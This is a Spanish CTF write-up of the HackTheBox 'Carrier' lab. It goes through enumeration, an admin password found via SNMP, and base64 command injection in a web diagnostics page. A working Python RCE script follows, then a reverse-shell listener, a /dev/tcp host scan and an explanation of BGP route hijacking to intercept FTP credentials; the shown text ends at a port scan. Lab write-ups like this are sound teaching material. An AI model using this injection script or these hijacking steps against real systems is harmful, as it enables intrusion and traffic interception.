---
layout      : post
title       : "HackTheBox - Carrier"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png
category    : [ htb ]
tags        : [ BGP-hijacking, SNMP, command-injection, quagga, router, FTP ]
---
Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con **SNMP**, inyección de comandos de un proceso en la web yyyyyy una locura llamada **BGP Hijacking**. Interceptaremos el tráfico de un servidor **FTP** para obtener credenciales de acceso.

![155carrierHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155carrierHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [snowscan](https://www.hackthebox.eu/profile/9267).

¡Que lindura como vamos a escalar esta cosaaaaaaaaaaaaaaaaa!!

Nos encontraremos con un servidor web con varios recursos fuera de nuestra vista, recolectaremos varias cositas para nuestro privesc. En la web tendremos un `login`, pero vamos a estar ciegos probando cosas.

Enumerando los puertos `UDP` encontraremos un servicio `SNMP` activo, jugando con `snmpwalk` veremos que devuelve una línea algo extraña al ver sus recursos. Si concatenamos lo encontrado antes, nuestro research y esta cadena, conseguiremos iniciar sesión en la web como el usuario `admin`.

Estando dentro encontraremos una parte que devuelve el resultado de -listar procesos internos- en la web, para saber que proceso listar usa una variable que es enviada en **base64** y por el método `POST`. Si nos ponemos traviesos con esa variable lograremos inyectar comandos en el sistema, nos aprovecharemos de esto para generar una **reverse Shell** como el usuario que sostiene la web, en este caso `root`.

Pues ya estaría ¿no? pos no :)

Enumerando el sistema nos daremos cuenta de que estamos dentro de un router :O (acá empezamos a concatenar lo encontrado al inicio), tendremos acceso a su configuración por medio de una `CLI` de la herramienta `Quagga`. 

Jugando y jugando veremos que necesitamos realizar un ataque llamado `BGP Hijacking`, tomando de nuevo lo encontrado al inicio sabremos que existen `3` routers, nosotros y dos más, hay un host entre tooodos los routers (obtenemos el segmento también de nuestra enum inicial) que esta conectándose a un servidor `FTP`, la idea con nuestro ataque es decirle a los dos routers (que están enviándose la data del server **FTP**) que nos posicionen como **"la mejor ruta"** para enviar la data de un lado a otro. Y de que nos sirve esto....

Sencillamente para interceptar toooodo el tráfico (en este caso) `FTP` que se estén enviando. Mediante este ataque (mmoooooooooooy lindo) vamos a conseguir ver las credenciales de acceso del usuario `root` al servidor **FTP**, haciendo reutilización de contraseñas lograremos una Shell por medio de `SSH` como el usuario `root`, ahora si en la máquina **Carrier**.

...

#### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Bastante real y 0 juegos, vamos a hablar con las manitos.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Es que a veces no vemos porque no queremos.

1. [Enumeración](#enumeracion).
  * [Enumeración de puertos con nmap](#enum-nmap).
  * [Enumeramos servidor web en el puerto 80, varios recursos, principalmente un **Login Panel**](#puerto-80).
  * [Logramos pasar el login encontrando credenciales por **SNMP**](#snmpwalk-creds).
2. [Explotación, inyectamos comandos en un apartado del servidor web](#explotacion).
3. [Escalada de privilegios, jugueteo con el protocolo BPG, intentando **BGP Hijacking**](#escalada-de-privilegios-bgp).
  * [Hablamos un poco sobre el protocolo BGP y sus características](#bgp-explain).
  * [Exploramos **CLI** de **Quagga** para comunicarnos con los sistemas autónomos de BGP](#cli-quagga-vtysh).
  * [Logramos **BGP Hijacking** peeero con un fallito](#fail-bgp-hijacking-ftp).
  * [Ahora si logramos **BGP Hijacking** y encontramos credenciales en tráfico FTP](#done-bgp-hijacking-ftp).
  
...

## Enumeración [#](#enumeracion) {#enumeracion}

---

### Enumeración de puertos con nmap [🔗](#enum-nmap) {#enum-nmap}

Vamos a empezar como siempre por nuestro escaneo de puertos:

```bash
❱ nmap -p- --open -v 10.10.10.105 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.105
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.105 () Status: Up
Host: 10.10.10.105 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 237.32 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Para obtener Shells seguras. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor web. |

Ahora con los puertos podemos realizar un segundo escaneo, pero para encontrar que versiones y scripts están siendo usados por cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno, en este caso no es relevante, ya que solo tenemos 2 puertos, pero pues cuando tengamos muchos esta herramienta es brutal**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.105
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.10.105 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Con este escaneo recibimos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.105
Nmap scan report for 10.10.10.105
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 22.76 seconds
```

Podemos destacar:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 |
| 80     | HTTP     | Apache httpd 2.4.18 |

No vemos nada más, así que empecemos a darle y descubramos por donde romper la máquina.

...

### Puerto 80 [🔗](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos encontramos con un **login panel**, unos errores y un nombre al parecer de un servicio, `Lyghtspeed`. Buscando info en la web sobre él no concluimos nada, así que sigamos enumerando.

Usando paylaods y credenciales conocidas en el login no logramos acceder, hagamos un fuzzeo de directorios a ver si existen objetos fuera a nuestra vista:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.105/
...
Target: http://10.10.10.105/

[25:25:25] Starting: 
[25:25:25] 301 -  310B  - /css  ->  http://10.10.10.105/css/
[25:25:25] 301 -  312B  - /debug  ->  http://10.10.10.105/debug/
[25:25:25] 301 -  310B  - /doc  ->  http://10.10.10.105/doc/
[25:25:25] 301 -  312B  - /fonts  ->  http://10.10.10.105/fonts/
[25:25:25] 301 -  310B  - /img  ->  http://10.10.10.105/img/
[25:25:25] 200 -    1KB - /index.php
[25:25:25] 301 -  309B  - /js  ->  http://10.10.10.105/js/
[25:25:25] 403 -  300B  - /server-status
[25:25:25] 301 -  312B  - /tools  ->  http://10.10.10.105/tools/
...
```

Dos interesantes, si profundizamos un toque más, vemos otro recurso:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.105/
...
[12:55:51] 301 -  312B  - /debug  ->  http://10.10.10.105/debug/
...
```

Así que tenemos inicialmente **3** recursos fuera de nuestra vista:

* `/doc`
* `/debug`.
* `/tools`.

Empecemos a ver si hay algo en ellos:

##### ~ <u>http://10.10.10.105/doc/</u>:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Dos archivos, bien, veamos otro recurso.

##### ~ <u>http://10.10.10.105/debug/</u>:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_debug.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

El resultado de ejecutar `phpinfo()`, ¿se ve la flecha? Hay varias cositas para leer en este recurso, sigamos con el otro.

##### ~ <u>http://10.10.10.105/tools/</u>:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tools.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Otro archivo.

Ahora que encontramos todos los recursos veamos si nos son de utilidad para jugar con el login...

...

##### ~ <u>http://10.10.10.105/doc/</u>:

---

🛎️ `error_codes.pdf`

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_errorcode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, este documento parece super interesante e importante para seguir, nos muestra varios errores (donde vemos dos con el código que vimos en el login, así que podemos tomar su definición y relacionarla), pero lo llamativo es el servicio del cual son originarios, `CW1000-X Lyghtspeed Management Platform v1.0.4`, el nombre es muy largo y si lo buscamos en internet lo que nos podemos encontrar son puros spoilers jajaj, así que rompamos la cadena.

Sabemos que es una plataforma de gestión en su versión `1.0.4`, `Lyghtspeed` ya lo habíamos buscado así que no nos interesa y nos quedaría `CW1000-X`, que si buscamos en la web, encontramos que es un **Access Controller (AC)**:

> "Es una tecnología que permite controlar de forma muy granular qué dispositivos pueden acceder a la red, permitiendo establecer políticas de gestión en los dispositivos" esto según [secure.it](https://www.secureit.es/sistemas-de-seguridad-it/network-access-control-nac/).

Pues muy rico, todo lo que encontramos habla de `Access Controller`.

Encontramos otro [recurso](https://sysnetcenter.com/documents/ip-com-cw1000-user-guide.pdf) que muestra una guía de usuario para un controlador de acceso, es muy interesante, échenle un ojito. Algo que encontramos en él (y en búsquedas) son unas credenciales que vienen detrás del dispositivo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_userguide_ac_creds.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* `admin:admin` (son las credenciales que siempre intento primero en cualquier login 😝)

Probando no logramos pasar el inicio de sesión, así que F.

Nos quedaremos con lo encontrado y seguiremos (tiene sentido lo del AC por los errores y por lo que vamos a ver a continuación).

🛎️ `diagram_for_tac.png`

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un diagrama de routers, al inicio estaba súper "WTF que es estoooooooooooooooooooooooooo y que hagooooooooo", pero con una simple búsqueda como `Lyghtspeed Networks` (que esta en la imagen, no me lo invente) vemos las relaciones y algunos spoilers que querrán traicionar nuestra mente, pero NOOO! nada de eso, vamos a investigar. 

> "Los routers guían y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web", dicelo [cisco](https://www.cisco.com/c/es_mx/solutions/small-business/resource-center/networking/what-is-a-router.html).

En el primer link vemos un recurso llamado [BGP Hijacking Attack, Border Gateway Protocol, Network Routing, Internet Infrastructure](https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246), (que si profundizamos MMMMMMUUUUUCHO sabemos que tiene spoilers, así que hacemos scroll hacia el inicio del archivo y vamos bajando muy despacio) al inicio esta lo que nos interesa 😬

> "BGP is the routing protocol that runs the Internet. It manages how packets get routed from network to network by exchanging routing and reachability information.", [nvidia](https://docs.nvidia.com/networking-ethernet-software/cumulus-linux-41/Layer-3/Border-Gateway-Protocol-BGP/).

...

❗❗❗ ***PEEEEEEEEEEEEERO después de leer cositas de estas y relacionar lo único que tenemos (el `Login`) me di cuenta de que esta explicación no tiene mucho sentido aún, así que sigamos con los demás recursos y cuando llegue el momento (va a llegar seguro, por la imagen que vimos del diagrama y lo que se lee y ve en el artículo) volveremos a este loco tema...***

...

🛎️ Si revisamos el recurso `/tools/remote.php` nos devuelve:

> <span style="color: yellow;">License expired, exiting...</span>

Y poco más podemos hacer con él...

Finalmente viendo el contenido de `/debug` (donde veíamos el resultado de la función `phpinfo()`) además de algunas versiones, no hay nada relevante. Así que tamos F :(

...

### Logramos pasar el login encontrando creds por <u>SNMP</u> [🔗](#snmpwalk-creds) {#snmpwalk-creds}

Después de leer lo del **Access Controller** se me dio por enumerar puertos `UDP` con **nmap** (usamos el parámetro `-sU`), quizás había algo de redes por ahí activo y sí, hay algo:

```bash
❱ nmap -sU -p- --open --min-rate=2000 -oG udpScan
```

El escaneo va super lento, por eso le agregamos el parámetro `--min-rate=N`, para indicarle que no envíe menos de N paquetes en cada petición, así va muuucho más rápido, el escaneo nos responde:

```bash
# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=2000 -oG udpScan 10.10.10.105
# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.105 () Status: Up
Host: 10.10.10.105 () Ports: 161/open/udp//snmp///
# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 368.28 seconds
```

Puerto `161/udp` abierto, que con nuestro segundo escaneo confirmamos el servicio **SNMP** (digo confirmamos porque ya lo sabía al ver el puerto, pero quizás uds no e.e):

```bash
# Nmap 7.80 scan initiated Tue Jul 27 25:25:25 2021 as: nmap -sU -p 161 -sC -sV -oN udpPortScan 10.10.10.105
Nmap scan report for 10.10.10.105
Host is up (0.11s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: pysnmp
|   engineIDFormat: octets
|   engineIDData: 77656201e85908
|   snmpEngineBoots: 2
|_  snmpEngineTime: 3h16m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10.35 seconds
```

Perfecto, exploremos un poquito el servicio:

...

> "SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...)", [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp). Lo cual tiene muuuucho sentido, ya que hay un **Access Controller** activo, pueda que este servicio lo este monitoreando (: me gusta.

Algunas cositas a tener en cuenta para saber que estamos haciendo con la siguiente herramienta, es entender o al menos intentarlo sobre la estructura que maneja SNMP para comunicarse, todo esta en este link:

* [SNMP - Explained](https://book.hacktricks.xyz/pentesting/pentesting-snmp).

> No lo explico yo por que se alarga mucho y además esta super bien detallado ahí.

Vamos a usar la herramienta `snmpwalk` con esta estructura:

```bash
❱ snmpwalk -v2c -c public 10.10.10.105
```

Donde en resumidas cuentas le decimos que nos extraiga del MIB (Base de gestión de la información) (que sería la data organizada jerárquicamente) todo lo relacionado con la comunidad `public`, muy resumido :P

Pues ejecutándolo nos responde:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_smnpwalk.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Solo dos líneas y una con un contenido medio extraño, pero a la vez con algo de sentido (NET..), se me dio por probar esa cadena (completa) contra el login y el usuario `admin` (que vimos en la guía de usuario e.e) pero nada :(

PEEEEEEEEEEEEERO si le quitamos el `SN#` y volvemos a probaaaaaaaaaaaaaaaaaaaar.

Tamos dentro pai:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_dashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

### Enumeramos recursos ya con una sesión dentro de la web [🔗](#login-done) {#login-done}

Inicialmente recordamos el output del recurso `remote.php` que hablaba sobre una licencia expirada, acá también sale algo así, pero diciendo que es inválida :(

Hay algunos recursos para ver, caigamos en `tickets.php`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tickets.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Uff, varias cositas para leer, los tickets `5` y `6` están llamativos y el `8` habla de nuevo de `BGP`, jmmm, veamos que hay en **Diagnostics** (`diag.php`):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Damos clic en `Verify Status` y obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag_verifystatus.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmm, parece un output de algún comando, si investigamos el código fuente del la web vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_diag_code_b64value.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una cadena al parecer en **base64**, si la decodeamos tenemos:

```bash
❱ echo "cXVhZ2dh" | base64 -d
quagga
```

Y si nos fijamos en las peticiones, vemos que ese campo es el que viaja con el método **post**, esto me llevo a profundizar con **BurpSuite** y mostrarles lo siguiente:

Abrimos Burp, ponemos el proxy en escucha e interceptamos la petición:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_original.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Todo normal, pero ¿y siiii intentamos enviarle otra cadena en **base64**? Por ejemplo enviémosle la palabra **hola** encodeada:

```bash
❱ echo "hola" | base64
aG9sYQo=
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_hola.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa opa opaaaaa, nos muestra el comando que intenta hacer, lista los procesos del sistema y grepea por la cadena que enviamos en **base64** 🧐 ¿qué se les ocurre?

...

## Explotación [#](#explotacion) {#explotacion}

¿Y si además de grepear algo le decimos que ejecute algo más? Intentemos que nos devuelva el resultado del comando `id`:

Para decirle que queremos ejecutar un comando aparte al que esta haciendo simplemente le indicamos un punto y coma (`;`), así ejecutara `grep ;lo_que_pongamos_acá`, o sea:

```bash
grep ; id
```

Veamos si es cierto:

```bash
❱ echo "; id" | base64
OyBpZAo=
```

La enviamos yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_id.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

POS MUY BIEEEEN!! Tenemos inyección de comandos :o Aprovechemos y generemos un script para automatizar el login, el encode y el envió del comando, así solo debemos preocuparnos por pasarle el comando al programa:

```py
#!/usr/bin/python3

import base64, sys, signal
import requests
from bs4 import BeautifulSoup

# CTRL+C
def def_handler(sig, frame):
    print()
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Validamos que el usuario agregue un comando
try:
    command = sys.argv[1]
except:
    print("\n[-] Ejemplo: python3 %s id\n" % (sys.argv[0]))
    exit(0)

URL = "http://10.10.10.105"

# RCE
def exe_commands(command):
    text_to_encode = "; " + command
    payload = base64.b64encode(bytes(text_to_encode, 'utf-8')).decode('ascii')

    data_post = {
        "check": payload
    }
    r = session.post(URL + '/diag.php', data=data_post)
    soup = BeautifulSoup(r.content, 'html.parser')

    # Sabemos que nos devuelve el resultado del comando desde el segundo tag <p>...</p>, 
    # así que si queremos concatenar comandos o ejecutar algunos con un output grande (como `ls -la /`), 
    # el for nos muestra su resultado con los siguentes <p>...</p>
    for i in range(1, 100):
        try:
            print(soup.find_all('p')[i].get_text())
        except IndexError as e:
            pass

if __name__ == '__main__':
    session = requests.Session()

    # Login
    data_post = {
        "username": "admin",
        "password": "NET_45JDX23"
    }
    r = session.post(URL, data=data_post)

    exe_commands(command)
```

Listos, validamos:

```bash
❱ python3 lyghtwebRCE.py id
uid=0(root) gid=0(root) groups=0(root)
```

Pues ahora si indiquémosle que nos genere un reverse Shell, pongámonos en escucha:

```bash
❱ nc -lvp 4433
```

Y ejecutamos el comando:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_nc_rootSH_r1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOOO DENTROOOOOOOOOOOOOOOOO (: Hagamos [tratamiento de la TTY](https://lanzt.gitbook.io/cheatsheet-pentest/tty) para obtener una Shell completica y sigamos...

*Como vemos no estamos en la máquina host aún, nuestro **hostname** se llama `r1` y nuestra IP no es `10.10.10.105`, así que tendremos que saltar :)*

...

## Jugamos con el servicio BGP [#](#escalada-de-privilegios-bgp) {#escalada-de-privilegios-bgp}

Si enumeramos el sistema vemos cositas que nos recuerdan que habíamos dejado un tema de lado.

Vemos servicios activos:

```bash
root@r1:/# netstat -lnp
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_netstatLNP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un servicio llamado `bgpd` corriendo en dos puertos, el `2605` y el `179`. Y otro servicio llamado `zebra` corriendo en el puerto `2601`.

### Entendemos algo del protocolo BGP y sus características [🔗](#bgp-explain) {#bgp-explain}

Les dejo un video muuuuy interesante para entender mejor el protocolo `BGP`:

* [YT - What is BGP (Border Gateway Protocol)? An Introduction](https://www.youtube.com/watch?v=A1KXPpqlNZ4).


Antes habíamos referenciado un [artículo](https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246) para entender lo que había en esta imagen:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

A él llegamos buscando info referente a `Lyghtspeed Networks` (de la imagen), profundizando en el post vemos unas cositas llamadas `AS` (Sistema Autónomo), ahí, en ese momento, si miramos nuestro diagrama también hay algo llamado `AS...`, es cuando nos damos cuenta de que hay muuucha probabilidad de que lo que encontramos (los servicios locales y lo que vimos en los tickets, (hablan mucho de `BGP`)) este relacionado con nuestro diagrama, así que descubramos si es así.

Como ya reseñamos, el [protocolo **BGP**](https://es.wikipedia.org/wiki/Border_Gateway_Protocol) (Border Gateway Protocol) permite interconectar grandes grupos de redes, a cada gran red se le conoce como un `AS` ***(sistema autónomo)*** que se caracterizan por poseer una clara, independiente y única ***política*** de enrutamiento.

🙋 ¿Se acuerdan que es un router? ¿Nop? Breeeves:
*"Los routers guían y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web"*, [*cisco*](https://www.cisco.com/c/es_mx/solutions/small-business/resource-center/networking/what-is-a-router.html).

> **Característica fundamental de un Sistema Autónomo**: realiza su propia gestión del tráfico que fluye entre él y los restantes Sistemas Autónomos que forman Internet. [Wikipedia](https://es.wikipedia.org/wiki/Sistema_aut%C3%B3nomo).

Como bien dice el post sobre ataques `BGP`, el protocolo es como un pegamento y su función en -pegar- (conectar) toda la Internet.

> "BGP is used for reachability information and routing data packets from one large network to another." [r3d-buck3t](https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246).

...

Si seguimos enumerando el sistema vemos este script en el directorio `/opt`:

```bash
root@r1:/opt$ cat restore.sh 
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```

Bien, algunas tareas llamativas y otro servicio, [Quagga](https://es.wikipedia.org/wiki/Quagga_(enrutador)), en internet encontramos que se trata de un software para enrutar y que su uso es muy parecido a la CLI de `cisco`. Entre los protocolos que soporta esta `BGP`, así que busquemos más sobre el software.

Llegamos a este [recurso](https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/) que nos ilustra con varios términos, archivos y líneas de comandos con las que podemos o no jugar :P

Algo llamativo del script que vimos antes, es el archivo `/etc/quagga/bgpd.conf`:

```bash
root@r1:/opt$ cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

Notamos las referencias hacia los "vecinos" (ya veremos que es esto) `AS200` y `AS300`, o sea que si ahora relacionamos el diagrama con estas IPs, podemos organizar nuestras ideas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac_withIPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, con ayuda de [este recurso](https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#neighbour) sabemos que los "vecinos" son otros routers con los cuales podemos intercambiar información:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_bgp_neighbor.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, pero, de que nos sirve saber todo esto y como se supone que puede haber una explotación ahí, buaaa, pues facilito. 

Existe un ataque llamado [secuestro de rutas (BGP Hijacking)](https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/), la labor es hacerle creer a un **AS** que existe una ruta mucho más corta para enviar la información y esa ruta más corta seremos nosotros en la mitad viendo todo el tráfico enviado 💀 (en resumidas palabras claramente), esta imagen de [cloudflare](https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/) da a entenderlo mejor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_cloudflare_bgphijacking_technical_flow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_cloudflare_howorksBGPhijacking.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pueeeees, eso, ehhhh, veamos como romper esto (mucho info, estoy a 🤏 de que me explote la cabeza 😁, a darle)

...

Entonces tenemos que de alguna manera indicarle que el tráfico que sea que se esté generando entre **AS200** y **AS300** nos lo muestre a ya sea indicándole al **AS200** que nuestra ruta es más rápida para llegar a **AS300** o diciéndole a **AS300** que nuestra ruta es más rápida para llegar a **AS200**.

Si revisamos nuestro reporte de tickets, podemos intuir cositas con respecto a los routers y sus servicios:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tickets_importanThings.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Quizás son pistas como pueda que no, pero hablan de un **CVE**, unos problemas de rutas por malas configuraciones, a `CastCom` (nuestro router **AS300**). Temas relacionados con un server en concreto que mantiene un <u>importante</u> servicio `FTP` y pruebas de inyección en rutas :P Muy loco e.e

Lo de `FTP` suena interesante, porque nos podría estar diciendo que `CastCom` esta enviando data por `FTP`. Toma sentido el ataque para interceptar el tráfico, ¿no? Pero igual no sabemos en cuál IP de todo el segmento de `10.120.15.0/24` esta el servidor **FTP**, ni siquiera sabemos cuáles direcciones de ese segmento están activas, pues averigüémoslo:

```bash
root@r1:/tmp$ cat scanIPs.sh
#!/bin/bash

for ip in {1..255}; do
    timeout 1 bash -c "echo '' > /dev/tcp/10.120.15.$ip/21" 2>/dev/null && echo "[+] La IP 10.120.15.$ip tiene el puerto 21 abierto" &
done; wait
```

Le decimos que nos haga un bucle con 255 repeticiones, donde ese número será el último octeto de la IP. Para comprobar si existe una IP con ese PUERTO, enviara una traza por cada IP contra el puerto `21`, si en algún momento la respuesta no nos devuelve error pasa a ejecutar el siguiente comando, o sea, nos muestra la IP que tiene activo el puerto.

Si lo ejecutamos, rápidamente vemos la IP:

```bash
root@r1:/tmp$ ./scanIPs.sh 
[+] La IP 10.120.15.10 tiene el puerto 21 abierto
```

Pos perfecto, ya tenemos la IP.

Si quisiéramos saber si existen más puertos abiertos en ella, podemos ya sea modificar el script colocando la IP completa y que el iterador ahora esté en el puerto, o usar `nc`, por ejemplo para ver el rango de puertos del **20** al **10000** y ver cuáles están abiertos:

```bash
root@r1:/tmp$ nc -z -v 10.120.15.10 20-10000 2>&1 | grep succeeded
Connection to 10.120.15.10 21 port [tcp/ftp] succeeded!
Connection to 10.120.15.10 22 port [tcp/ssh] succeeded!
Connection to 10.120.15.10 53 port [tcp/domain] succeeded!
```

